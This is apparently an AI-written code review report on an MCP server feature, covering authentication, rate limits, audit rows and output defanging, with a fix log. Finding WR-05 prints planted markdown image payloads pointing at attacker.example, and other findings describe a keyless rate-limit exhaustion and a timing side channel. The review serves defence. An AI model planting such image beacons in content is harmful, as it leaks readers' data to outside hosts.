---
phase: 305
scope: "305-01..03"
reviewed: 2026-10-31T00:00:00Z
depth: standard (deep on auth / visibility / refusal / audit / spend paths)
diff_range: 43e95f6b5..e456f4af3 (excluding 472414970, unrelated ingestion fix)
files_reviewed: 51
files_reviewed_list:
  - backend/Dockerfile
  - docker-compose.prod.yml
  - supabase/migrations/222_mcp_usage_limits_and_redaction.sql
  - scripts/check-migration-222-live.py
  - scripts/full-schema-supplement.sql
  - backend/app/main.py
  - backend/app/mcp/__init__.py
  - backend/app/mcp/access_log.py
  - backend/app/mcp/audit.py
  - backend/app/mcp/dispatch.py
  - backend/app/mcp/edge.py
  - backend/app/mcp/limits.py
  - backend/app/mcp/read_tools.py
  - backend/app/mcp/results.py
  - backend/app/mcp/server.py
  - backend/app/mcp/tools.py
  - backend/app/mcp/transport.py
  - backend/app/middleware/maintenance.py
  - backend/app/security/api_key_auth.py
  - backend/app/security/mcp_principal.py
  - backend/app/services/acting_member_reads.py
  - backend/app/services/mcp_tool_catalogue.py
  - backend/app/services/openai_service.py
  - backend/app/services/rate_limit.py
  - backend/app/services/usage_sink.py
  - backend/app/db/mcp_usage.py
  - backend/app/db/rates.py
  - backend/app/api/api_keys.py
  - backend/app/api/settings.py
  - backend/app/models/api_key.py
  - backend/app/models/user_settings.py
  - frontend/src/App.tsx
  - frontend/src/components/admin/spend/ExpertSpendCard.tsx
  - frontend/src/components/admin/spend/expertSpendCopy.ts
  - frontend/src/components/library/DocumentCantBeOpened.tsx
  - frontend/src/components/settings/ApiKeyLimits.tsx
  - frontend/src/components/settings/apiKeys/ApiKeyActivity.tsx
  - frontend/src/components/settings/apiKeys/ApiKeyCallStrip.tsx
  - frontend/src/components/settings/apiKeys/ApiKeyCard.tsx
  - frontend/src/components/settings/apiKeys/ApiKeysTab.tsx
  - frontend/src/components/settings/apiKeys/apiKeyFacts.ts
  - frontend/src/components/settings/apiKeys/apiKeysCopy.ts
  - frontend/src/components/settings/apiKeys/mcpCallWords.ts
  - frontend/src/components/settings/apiKeys/mcpKeyCopy.ts
  - frontend/src/hooks/useAppNavigation.ts
  - frontend/src/hooks/useLibraryDocuments.ts
  - frontend/src/lib/api/apiKeys.ts
  - frontend/src/lib/api/skills.ts
  - frontend/src/lib/api/spend.ts
  - frontend/src/lib/appRoutes.ts
  - frontend/src/lib/citationNav.tsx
  - frontend/src/pages/LibraryPage.tsx
  - frontend/src/types/spend.ts
findings:
  critical: 0
  warning: 6
  info: 7
  total: 13
status: fixed
fixed_at: 2026-10-31
---

# Phase 305 (plans 01-03): Code Review Report

**Reviewed:** 2026-10-31
**Depth:** standard, deep on the auth edge, the narrowed reads, the refusal shapes, the audit path and the spend leg
**Files Reviewed:** 51 source files (tests and planning artifacts are out of scope; 305-04 is not covered here)
**Status:** issues_found

## Summary

I traced the security-bearing paths through the code they call (`authenticate_presented_key`,
`principal_still_allowed`, `acting_member_reads`, `retrieval_service` / `retrieval_documents`,
`audit_service.write_audit_entry`, the SDK's stateless manager, the `per_root` CTE consumers).
**No blocker survived the tracing.** What I checked and found to hold:

- **Credential refusals.** No header, a non-Bearer header, an empty token, a malformed or wrong-prefix
  string, an app JWT (no `srl_mcp_` prefix, so `digest_key` returns `None` before any read), an unknown
  digest, a hash mismatch, wrong kind, revoked, expired, not a member and banned all reach the one
  `_INVALID_BODY` / `_INVALID_HEADERS` 401 built at import (`edge.py:128-136`, `edge.py:217-228`).
  Only `KeyRefused` with a sentence (`mcp_off_org` / `mcp_off_deployment`, checked after every
  liveness refusal) answers 403. The edge never calls `get_current_user`. Timing is the one residual
  difference (IN-01).
- **Acting org.** Every read and write takes `principal.org_id`, which comes only from the resolved key
  row. `X-Org-Id` is not read on this path, and neither is any argument or query string.
- **Scope.** All three tools go through `acting_member_reads` on `acting_member_connection` with
  `_scope_clauses`. The new `folder_id` / `root_only` predicates are ANDed after the scope clauses and
  bound as `$N`. The folder-visibility check runs before the listing. Missing, forbidden, other-org,
  malformed and cursor-for-another-document reads all return `NOT_AVAILABLE_SENTENCE`. A tampered
  cursor is only a position: the read is re-authorised on every call.
- **Leaks.** The low-level `Server` is used. `on_call_tool` catches every exception except `MCPError`
  (maintenance), and `_write_usage` and the audit helpers swallow their own errors. No `str(exc)`,
  SQL or internal id reaches a result.
- **Mount and transport.** The Host allowlist comes from the same predicate as the mount, no Origin is
  allowed, and production refuses the mount for an unset, loopback or non-https base. Both `/mcp` and
  `/mcp/` are registered as raw Routes, so nothing redirects. `access_log` strips query strings from
  MCP lines.
- **Migration 222.** RLS is on with no policy. Privileges are revoked from `PUBLIC` first, then from
  `anon`, `authenticated` and `service_role`, and granted back to `service_role` only. No functions
  are added, so the EXECUTE trap does not apply. `pii_redaction_enabled` stays outside the column
  UPDATE grant, and the verify block checks it through `has_column_privilege`, which also counts
  PUBLIC grants.
- **Spend leg.** The `runs` arm of `roots` / `members` is unchanged and its `members` join is now
  filtered with `ro.source = 'run'`, so non-MCP figures are unchanged. The MCP arm is org-filtered in
  `roots`. The `api_keys` label join is org-constrained.
- **Event loop.** `get_service_role_supabase` and `load_user_settings` are off the loop. Rerank and
  embedding were already threadpooled. `resolve_effective_embedding_provider` is pure.

The warnings are about robustness and honesty. The biggest are WR-01: bad arguments skip the per-key
limit and write an unthrottled audit row each time; and WR-02: the pre-key per-address bucket is in
practice one door-wide bucket, which anyone can empty without a key.

## Warnings

### WR-01: Calls with invalid arguments skip the per-key limit and each writes an unthrottled audit row

**File:** `backend/app/mcp/dispatch.py:107-115` (with `:99`, `:121-126`)
**Issue:** Argument validation runs before `_limits.check_limit`. When `model_validate` raises, the
function returns a tool error before the call is counted. `audit` still holds its initial
`{"refused": False, "outcome": "error"}`, so the `finally` calls `audit_answered`, which is
deliberately not throttled because "answered calls are already bounded by the two per-key buckets"
(`audit.py` docstring). That bound does not cover this path.

Scenario: a valid key loops `tools/call read_document` with `{"document_id": 1, "x": 1}`. `extra="forbid"`
fails, the bucket never fills, and every call builds a service-role client and inserts an `audit_log`
row. Only the shared `mcp_ip` bucket stops it, at 1,200 a minute, and that bucket is door-wide (WR-02),
so the same loop also locks every other MCP user out. This is the write-amplifier class that
293-REVIEW CR-02 closed for refusals, reopened for "answered" errors.
**Fix:** Count the call before validating, so every registered, granted call costs one unit of its bucket:
```python
limited = await _limits.check_limit(principal, spec, redis)
if limited is not None:
    audit = {...}; return tool_error(limited.sentence)
try:
    args = spec.args_model.model_validate(arguments or {})
except ValidationError:
    return tool_error(...)
```
Alternatively, write bad-argument rows through `audit_refused` (reason `invalid_arguments`) so the
CR-02 throttle covers them. Add a test asserting N+1 bad-argument calls in one minute hit the limit.

### WR-02: The pre-key `mcp_ip` bucket is one bucket for the whole MCP door, and needs no key to empty

**File:** `backend/app/mcp/edge.py:199-214`; `backend/app/services/rate_limit.py:84-88, 153-157`
**Issue:** The edge keys the limit on `scope["client"][0]`. The module's own comment
(`rate_limit.py:84-87`) says that behind Coolify's Traefik or the one-box nginx, every caller arrives
from the proxy's address (uvicorn trusts forwarded headers only from 127.0.0.1, and the Dockerfile CMD
sets no `--forwarded-allow-ips`). So `mcp_ip` is in practice one counter for every MCP client of the
deployment.

The limit runs before any key is read, and `initialize`, `notifications/initialized` and `tools/list`
never reach a per-key bucket. Scenario: an unauthenticated client sending about 20 garbage POSTs a
second (`Authorization: Bearer x`) holds the counter above 1,200. For the rest of each minute, every
member's Claude Code or Cursor gets 429. Repeating it costs nothing. D-54 gave MCP its own bucket so
it cannot starve `/inbound`, but nothing stops MCP starving itself.
**Fix:** Derive the real client address before counting: set `--forwarded-allow-ips` to the proxy's
network in `backend/Dockerfile` and the one-box compose (deploy-artifact parity, same commit), or
read `X-Forwarded-For` from a trusted-proxy list in the edge. Until that lands, record the door-wide
ceiling as an accepted risk in `305-SECURITY.md` and in the UAT notes for D-43 (cloud container).
Consider giving `initialize` / `tools/list` a per-key cheap bucket as well.

### WR-03: An audit row or spend row that was owed can be lost when the request is cancelled

**File:** `backend/app/mcp/dispatch.py:121-126` and `:133-140`
**Issue:** Both the one audit row and the `mcp_usage` rows are written by an `await` inside a
`finally`. The SDK runs handlers under anyio, whose cancellation is level-triggered: once the
request's cancel scope is cancelled, every later unshielded `await` in that scope raises
`CancelledError` straight away. That includes the awaits in `finally`.

Triggers: the client disconnects mid-search (a Claude Code timeout, or the user pressing Esc), the
stateless transport is terminated, or uvicorn's new `--timeout-graceful-shutdown 5` cancels in-flight
requests on a deploy. When the embedding has already been paid for, `_write_usage`'s
`await insert_usage(...)` is cancelled and no spend row exists. `audit_answered` / `audit_refused`
catch only `Exception`, and `CancelledError` is a `BaseException`, so the audit row is skipped too.
That breaks "exactly one audit row per call on every exit path" (D-26 / T-305-12) and GUARD-02
("a search-only session appears in spend") for exactly the calls a user abandoned.
**Fix:** Shield the bookkeeping with a deadline so it neither disappears nor hangs:
```python
import anyio
finally:
    with anyio.move_on_after(5, shield=True):
        if audit["refused"]:
            await _audit.audit_refused(...)
        else:
            await _audit.audit_answered(...)
```
Do the same around `_write_usage` in `_run`. Add a test that cancels the handler after
`usage_sink.record` and asserts one audit row and one `mcp_usage` row.

### WR-04: A tool result with `isError: true` is audited `outcome: ok`, so the key card shows "✓ answered"

**File:** `backend/app/mcp/dispatch.py:116-119`; `backend/app/mcp/read_tools.py:228-239, 186-187`; `backend/app/api/api_keys.py:222`; `frontend/src/components/settings/apiKeys/mcpCallWords.ts:46`
**Issue:** A handler's refusal sentence ("No document with that id is available to this key.",
"That cursor doesn't belong to this listing...", "This document has no readable text yet.") goes to
`_finish`, which wraps it in `tool_error(...)` with `is_error=True`. The audit is then set to
`{"refused": False, "outcome": "ok"}`. `_call_from_audit` turns `outcome: ok` into `ok=True`, and
`mcpCallWords` renders "✓ answered".

So the client's model is told the call failed while the owner's activity list says it succeeded.
Bad arguments, a sibling refusal, read "✕ failed". The focus rule ("a refusal must never read OK") and
the UI-SPEC's honest-words contract both fail for the not-available, bad-cursor and no-text cases.
**Fix:** Derive the audit outcome from the result instead of from the fact that the handler
returned: `outcome = "ok" if not result.is_error else "not_available"` (or `"refused"`). Add that
outcome to `mcpCallWords` with its own words ("✕ no such document for this key"), and pin with a
test that a missing-document read never renders `ok: true`.

### WR-05: Defang misses markdown images whose alt text has brackets, and shortcut-reference images

**File:** `backend/app/mcp/results.py:158-169`
**Issue:** `_MD_IMAGE` takes the alt text as `[^\]\n]*`, but CommonMark allows balanced brackets in
link text. `![a [b] c](https://attacker.example/p.png?d=1)` matches neither `_MD_IMAGE` nor
`_MD_IMAGE_REF`, so it passes through unchanged and still renders as an image. Shortcut references
also survive: a document containing `![logo]` and `[logo]: https://attacker.example/t.png`. The
`<img>` rule does not cover other auto-loading HTML (`<picture><source srcset>`, `<video poster>`,
`<iframe src>`, `<svg><image href>`).

D-19 promises "the caller's client never fetches a URL a document planted". These are the planted-
document shapes that break that promise in any client that renders tool output as markdown or HTML
(Cursor's chat panel is the likely one).
**Fix:** Defang by structure, not by a narrow regex. Rewrite every `![` to `[image: `, which kills
inline, reference and shortcut forms alike, and strip `src`/`srcset`/`poster`/`href` from any raw HTML
tag (or drop raw HTML tags entirely):
```python
_IMG_BANG = re.compile(r"!\[")
_HTML_TAG_URL = re.compile(r"<(img|source|video|audio|iframe|embed|object|svg|image|link|picture)\b[^>]*>", re.I)
out = _IMG_BANG.sub("[image: ", text)
out = _HTML_TAG_URL.sub("", out)
```
Add regression cases for nested-bracket alt text and shortcut references to `test_305_search_shape.py`.

### WR-06: `list_documents` silently drops every subfolder after the 100th, with no cursor to reach them

**File:** `backend/app/mcp/read_tools.py:213`; `backend/app/mcp/results.py:44`
**Issue:** `shown_folders = folders[: R.SUBFOLDER_CAP] if offset == 0 else []`. The cursor pages
documents only, so folder 101 onward (top level or inside a folder) never appears on any page, and
the result says nothing about the cut. The tool description promises it "lists that folder's
subfolders". An agent browsing a large org will conclude the missing folders do not exist, and
their documents can be reached only through search.
**Fix:** Page folders before documents through the same cursor, for example `{v, f, fo, o}` with a
folder offset, emitting `next_cursor` while folders remain. At minimum, add a `folders_truncated:
true` field and say so in the text rendering.

## Info

### IN-01: A presented secret that matches a real but revoked, expired or ex-member key answers measurably slower than garbage

**File:** `backend/app/security/api_key_auth.py:363-388` (consumed by `backend/app/mcp/edge.py:220-229`)
**Issue:** Unknown digests and hash mismatches raise at once. A key row that exists but is refused
awaits `refusal_audit_slot` (Redis), and on the first refusal of each minute also awaits a
threadpooled client build plus an `audit_log` insert. The status, body and headers are identical, but
latency separates "this secret was once a real key" from "never was". Exploiting it requires the
exact 43-character secret, so it is not an enumeration oracle. It only confirms that a leaked string
was once valid. Recorded because the focus asked about timing. (This is pre-existing 304 core
behaviour, newly reachable through `/mcp`.)
**Fix:** Optional: schedule the refusal audit with `asyncio.create_task` (held in a strong set) and
return without awaiting it, or pad every refusal to a fixed floor.

### IN-02: Rerank usage can be recorded under the embedding model

**File:** `backend/app/mcp/read_tools.py:154-158`; `backend/app/mcp/dispatch.py:146-155`; `backend/app/services/usage_sink.py:103-104`
**Issue:** `record()` turns an empty `rerank_model` (`user_settings` reads `""` by default) into
`None`, and `_write_usage` then fills `None` with `settings.embedding_model`. The provider falls back
to the embedding provider the same way. With rerank on and no explicit model, the spend page shows a
second "embedding" row for the rerank. The row has NULL tokens, so no dollars are wrong, but the model
donut and the unmeasured count misattribute it. The rerank is also recorded only `if rows`, which
reads the rows after the external filter, so a rerank whose results were all filtered out spends
without a row.
**Fix:** Have `_write_usage` back-fill model and provider only for entries that came from
`embed_texts` (add `kind: "embedding" | "rerank"` to the entry), and label an unnamed rerank as
`rerank:<provider or "unknown">`. Record the rerank whenever retrieval ran it, not only when rows survived.

### IN-03: `embed_texts` records the provider-echoed model id, not the configured one

**File:** `backend/app/services/openai_service.py:2727`
**Issue:** `getattr(response, "model", None) or effective_model`. Self-hosted and OpenAI-compatible
endpoints (LM Studio, Ollama, OpenRouter) often echo a different string than the registry id, so
`model_rates.model_id = m.model` misses and a priced model shows as unrated. This fails safe (unrated,
never $0), but it hides real spend.
**Fix:** Record `effective_model`, which is what the operator priced, and keep the echoed id only if
it is needed for diagnostics.

### IN-04: Activity words for the `maintenance` reason fall through to the raw code

**File:** `frontend/src/components/settings/apiKeys/mcpCallWords.ts:9-10, 51`; `frontend/src/components/settings/apiKeys/apiKeyFacts.ts:263-327`
**Issue:** The docstring says `limiter_unavailable` and `maintenance` "keep their shipped words".
`refusedWords` has a case for `limiter_unavailable` but none for `maintenance`, so a maintenance
refusal renders "✕ refused: maintenance". That is honest (it is the 293 raw-code fallback) but
inconsistent with the claim. It cannot fire in 305, because every tool is read-only, and 306 inherits it.
**Fix:** Add a `maintenance` case with a sentence ("Syrel was in maintenance mode") or correct the docstring.

### IN-05: An arrived document address outlives the panel

**File:** `frontend/src/lib/citationNav.tsx:125-144`; `frontend/src/pages/LibraryPage.tsx:892`
**Issue:** Only the refusal's Dismiss calls `leaveDocumentAddress()`. After a successful arrival at
`/app/library/<A>`, closing the panel or selecting document B leaves the address at `<A>`. A reload,
or a copied URL, reopens A while the person was last looking at B or at nothing.
**Fix:** Call `leaveDocumentAddress()` when the detail panel closes, or when the selection moves off
the arrived id, while an arrival is recorded.

### IN-06: Every MCP ledger row reads as "incomplete coverage", and KPI tiles count MCP calls as "runs"

**File:** `backend/app/db/rates.py:858-862, 924-930`; `backend/app/db/rates.py:553-560`
**Issue:** An MCP row has no thread, so the ledger's `incomplete_coverage` filter
(`wr.token_coverage IS NULL`) always matches it, while the summary card counts coverage from
`workflow_runs` alone. The two now disagree by the number of MCP calls. The rated, unrated and window
"run" counts also include every search, so an org with a busy AI tool key sees its "Unrated runs" tile
jump with no wording change. The `runs` arm is unaffected; this is a labelling and consistency matter.
**Fix:** Exclude `ro.source = 'mcp'` from the coverage filter, since coverage legs are a workflow
concept. On the tiles, either say "runs and AI tool calls" or report the MCP count apart (data only;
`AdminSpendPage.tsx` stays untouched per D-31).

### IN-07: Folder names of connector-fed subtrees are listed to a key that excludes external documents

**File:** `backend/app/mcp/read_tools.py:193-209`; `backend/app/services/acting_member_reads.py:212-219`
**Issue:** `include_external=false` filters connector-fed documents (the one predicate,
`source_connection_id`), but `list_folders` returns watch-synced folders and their names unfiltered,
so a key told to leave external sources out still shows a Drive tree's folder names. It is member-
visible data and its folders open to an empty page. Whether folder names count as "external content"
is a scope decision that D-22 does not make explicit.
**Fix:** Decide and record it. If names are out, hide folders whose subtree contains only
connector-fed documents (or folders created by a watch) when `exclude_external` is set.

## Fix log

Fixed 2026-10-31 by `gsd-code-fixer` in the main checkout on `develop` (base `d40839fc1`), scope:
WR-01, WR-03, WR-04, WR-05 and WR-06 (+ IN-04 only if it was a one-line copy addition). Each finding
was first re-driven against the current code. Every one reproduced, and each has a RED commit (its
failing test) before its fix. The 305-04 outbound guard in `dispatch.py` is untouched and still runs
on every model result.

| Finding | Outcome | RED (test) | Fix | How it was reproduced / what changed |
|---|---|---|---|---|
| **WR-01** | fixed | `4c383ce30` | `02ee2274c` | Reproduced: 6 bad-argument calls with the searches knob at 1 wrote **6** unthrottled `api_key.read` rows. `check_limit` now runs **before** `model_validate`, so every granted call costs one unit of its bucket. Result: one `api_key.read` (`error`) row, then refusals through `refusal_audit_slot` (one row written, the rest counted). Still exactly one audit row per call. |
| **WR-02** | skipped (by decision) | — | — | Out of scope for this fix pass. The orchestrator records the door-wide `mcp_ip` bucket as an accepted risk and a seed. |
| **WR-03** | fixed | `9123b1dd8` | `37abc6cd3` | Reproduced: a mid-search anyio cancel left **0** audit rows, and a hung audit write hung the call. Both `finally` writes (the audit row in `dispatch`, the `mcp_usage` rows in `_run`) now run inside `anyio.move_on_after(BOOKKEEPING_DEADLINE_S=5, shield=True)`. The test cancels after `usage_sink.record` and sees exactly one audit row (`outcome: error`) and one `mcp_usage` row (`status: failed`, tokens kept). |
| **WR-04** | fixed: requires human verification | `cb9db2cda` | `aafc212a6` (+ pin `080a2dbb3`) | Reproduced: all three handler refusal sentences were audited `outcome: ok`. The outcome now comes from the result: `not_available` when `result.is_error`, so `_call_from_audit` reads `ok: false`. This overrules 305-03 SUMMARY deviation 6. The key card has its own words for it (`mcpKeyCopy.calls.notAvailable` = "✕ not available: nothing this key can read there"), and the raw-code fallback is no longer used. No wire field changed (`outcome` is already `str`), so the OpenAPI snapshot does not move. Human check: confirm the one literal should cover not-available, bad-cursor and no-text alike. |
| **WR-05** | fixed | `0eec1837d` | `732e66a4e` (+ docstring `831c7cfae`) | Reproduced: 27 planted shapes passed through. Alt text is now matched one bracket level deep. Any `![` left after that loses its `!`, which covers shortcut and unclosed images. HTML tags that load a URL by themselves (img, image, picture, source, video, audio, track, iframe, frame(set), embed, object, applet, svg, use, feimage, link, style, script, meta, base, portal) are removed. Every other tag loses `src`, `srcset`, `poster`, `background`, `lowsrc`, `dynsrc`, `data`, `style`, `xlink:href`, `formaction`, `ping`, `action`, and `href` (except on `<a>`). The cases are in `test_305_search_shape.py`. |
| **WR-06** | fixed: requires human verification | `53c20c562` | `bde9a4e66` | Reproduced: with 250 top-level folders or 130 subfolders, nothing past the 100th was ever listed. Folders now page `SUBFOLDER_CAP` at a time alongside the document pages, through the same validated cursor (`fo` is optional and present only while folders remain). A listing of 100 folders or fewer keeps the 305-02 cursor byte for byte, and a cursor stays bound to its folder. Proven with mocked reads at 250 / 130 / 101 folders. Human check: the paging order (folders and documents advance together, not folders first). |
| WR-03 follow-up | fixed | (the gate) | `ad474d071` | The first backend baseline run read **71** against the measured 70. The extra failure was mine: `test_300_clean_image_imports::test_every_mcp_module_import_ships_in_the_built_image`, because `dispatch.py` now imports `anyio`. That fence's map now says which declared distribution ships it: `anyio` maps to `mcp`, which hard-depends on `anyio>=4.9` (and so does `starlette`). The re-run reads 70. |
| **IN-04** | skipped | — | — | This is not a one-line copy addition in `mcpCallWords.ts`. The words have to live in `mcpKeyCopy.ts` (the one string home) and need a case line plus a test. Left for 306, which first makes `maintenance` reachable. |

**Gates (final, at `ad474d071`, under the local-DB lock):**

- Targeted backend (`pytest tests/unit -q -k "305 or test_304 or test_268 or test_276"`): `803 passed, 10629 deselected, 1 warning in 95.99s`.
- Backend baseline: `[GATE PASSED] Backend unit baseline satisfied (failed: 70 <= 71, errors: 0).` Summary: `70 failed, 11357 passed, 1 skipped, 2 xfailed, 2 xpassed, 62 warnings in 523.08s (0:08:43)`. 70 equals the measured base. No failing id matches `305|293|304|mcp|pii|redact|outbound|clean_image` (grep over the 70 `FAILED` lines = 0).
- Frontend vitest (`src/components/settings/apiKeys`, `--maxWorkers=2`): `Test Files 17 passed (17)` · `Tests 230 passed (230)`. The `mcpCallWords.test.ts` pin was raised from 8 to 9 (`080a2dbb3`).
- Frontend typecheck (`npx tsc -p tsconfig.app.json --noEmit`): 61 errors, the same count as base. None is in a file this pass touched (`mcpCallWords.ts`, `mcpKeyCopy.ts`, `mcpCallWords.test.ts`: 0 errors).
- OpenAPI snapshot: not regenerated. No wire field changed (`ApiKeyCall.outcome` is `str`), and `test_276` is green inside the targeted run.

---

_Reviewed: 2026-10-31_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard (deep on security-bearing paths)_
